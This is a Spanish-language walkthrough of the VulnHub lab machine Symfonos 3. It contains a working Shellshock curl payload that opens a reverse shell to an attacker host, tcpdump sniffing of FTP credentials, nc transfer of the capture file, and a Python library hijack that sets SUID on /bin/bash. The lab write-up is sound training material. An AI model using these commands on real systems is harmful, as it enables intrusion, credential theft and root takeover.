---
tags:
  - estado/completo
plataforma: "[[VulnHub]]"
web: https://www.vulnhub.com/symfonos3
dificultad: Fácil
os: Linux
relacionados:
  - "[[pspy]]"
  - "[[cgi-bin]]"
  - "[[tcpdump]]"
  - "[[Shellshock]]"
---
#  VulnHub - Symfonos 3

## Reconocimiento

### Descubrimiento de la Máquina

- **Herramienta utilizada**: `nmap` para escanear la red local y encontrar la dirección IP de la máquina vulnerable.
  ```bash
  nmap -sn 172.16.30.0/24
  ```
  - IP identificada: **172.16.30.6**.

### Escaneo de Puertos y Servicios

- **Comando**: Escaneo completo con detección de versiones y scripts básicos:
  ```bash
  nmap -p- -sC -sV -T4 -v -o tcp.nmap 172.16.30.6
  ```
- **Resultados**:
  - **Puerto 21 (FTP)**: ProFTPD 1.3.5b (no vulnerable a mod_copy).
  - **Puerto 22 (SSH)**: OpenSSH 7.4p1.
  - **Puerto 80 (HTTP)**: Apache 2.4.25 (página sin título, solo una imagen).

### Enumeración Web
- **Directorios críticos**: Uso de `gobuster` con múltiples wordlists:
  ```bash
  gobuster dir -u http://172.16.30.6/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php" --add-slash
  ```
  - Ruta encontrada: **/gate/cerberus/tartarus/research** (página con contenido textual).
  - Directorio oculto: **/cgi-bin** (acceso prohibido, pero clave para la explotación).

---

## Análisis de Vulnerabilidades

### Identificación de CGI y Shellshock

- **Investigación**: El directorio `/cgi-bin` sugiere posibles scripts CGI. Se prueba la vulnerabilidad **Shellshock** (CVE-2014-6271).
- **Verificación con Nmap**:
  ```bash
  nmap --script=http-shellshock --script-args uri=/cgi-bin/underworld 172.16.30.6 -p 80
  ```
  - **Resultado**: Vulnerable a Shellshock.

---

## Explotación de Vulnerabilidades

### Obtención de Shell Inicial (Cerberus)

[Inside Shellshock: How hackers are using it to exploit systems](https://blog.cloudflare.com/inside-shellshock/)

- **Explotación con `curl`**:
  ```bash
  curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<IP_ATACANTE>/443 0>&1' http://172.16.30.6/cgi-bin/underworld
  ```
  - **Shell reverso**: Conexión exitosa como usuario **cerberus**.

---

## Escalada de Privilegios

### Enumeración Interna

- **Herramienta**: `linpeas.sh` o `lse.sh` para identificar posibles vectores.
  - **Hallazgos**:
    - Permisos para ejecutar `tcpdump` como cualquier usuario.
    - Archivo `/opt/ftpclient/statuscheck.txt` ejecutado por root, con grupo `hades`.

### Sniffing de Tráfico con tcpdump

- **Captura de tráfico en loopback**:
  ```bash
  tcpdump -i lo -w captura.pcap
  ```
- **Análisis de credenciales FTP**:
  ```bash
  tcpdump -qns 0 -A -r captura.pcap | grep "PASS"
  ```
  - **Credenciales encontradas**: `hades:PTpZTfT4Ce2C*****`.

También podría enviarme el archivo yo mismo a mi maquina para poder analizarlo mejor.
```
nc -nlvp > captura.pcap
nc <mi_ip> 443 < captura.pcap

# hago un md5sum en ambos lados para ver que el envio haya llegado sin modificaciones

tshark -r captura.pcap -V "ftp" 2>/dev/null
```

> [!tip]
>FTP por defecto no filtra el trafico, por lo que teniendo permisos del grupo pcap, puedo ver el trafico y la conexión que pasa por FTP.

### Acceso a Hades y Persistencia

- **Conexión SSH**:
  ```bash
  ssh hades@172.16.30.6
  ```
  - **Inspección de `/opt/ftpclient`**: Script `ftpclient.py` que utiliza `ftplib` con contraseña en texto claro.

### Descubrimiento de la Biblioteca Writable

Uso `pspy`: [GitHub - DominicBreuker/pspy: Monitor linux processes without root permissions](https://github.com/DominicBreuker/pspy)

Tras acceder como `hades`, se inspecciona el script `/opt/ftpclient/ftpclient.py`:
```bash
cat /opt/ftpclient/ftpclient.py
```
- **Hallazgo clave**: El script importa la biblioteca `ftplib` para conexiones FTP.
- **Búsqueda de la biblioteca**:
  ```bash
  find / -iname '*ftplib*' 2>/dev/null
  ```
  - **Ruta identificada**: `/usr/lib/python2.7/ftplib.py`.
- **Verificación de permisos**:
  ```bash
  ls -l /usr/lib/python2.7/ftplib.py
  ```
  - **Resultado**: `-rw-rw-r-- 1 root hades 28920 Feb 18  2021 ftplib.py`  
    *El archivo es modificable por el grupo `hades`, al que pertenecemos*.

> [!tip]
> Python cuando llama a una librería, primero la busca en el directorio actual, por lo que si creara una con el mismo nombre, podría usarla. De todas formas no tengo permisos para crear archivos ahí.

#### Contexto Técnico: ¿Por qué es Explotable?

- **Comportamiento de Python**: Cuando un script importa una biblioteca, **ejecuta todo el código en ella**. Si la biblioteca es editable, podemos inyectar código malicioso que se ejecutará con los privilegios del proceso que la llame.
- **Cron Job como Root**: El script `ftpclient.py` se ejecuta periódicamente vía cron con privilegios de root (verificado indirectamente por la existencia de `/opt/ftpclient/statuscheck.txt` y su contexto).

### Modificación de la Biblioteca de Python

1. **Editar `/usr/lib/python2.7/ftplib.py`**:
   ```bash
   echo 'import os; os.system("chmod u+s /bin/bash")' >> /usr/lib/python2.7/ftplib.py
   ```
   - **Explicación**:  
     - `chmod u+s /bin/bash` asigna el bit **SUID** a `/bin/bash`.  
     - Cuando el script `/opt/ftpclient/ftpclient.py` se ejecute (vía cron como root), este cambio se aplicará.

### Ejecutando /bin/bash con Privilegios de Root

1. **Iniciar una sesión de bash con SUID**:
   ```bash
   /bin/bash -p
   ```
   - **Flag `-p`**: Evita que bash elimine los privilegios elevados (SUID).

2. **Confirmar privilegios**:
   ```bash
   whoami  # Output: root
   id      # uid=1000(hades) gid=1000(hades) euid=0(root) grupos=1000(hades)
   ```

---

## Bandera(s)

> [!flag] `flag{root}`
> Congrats
^bandera
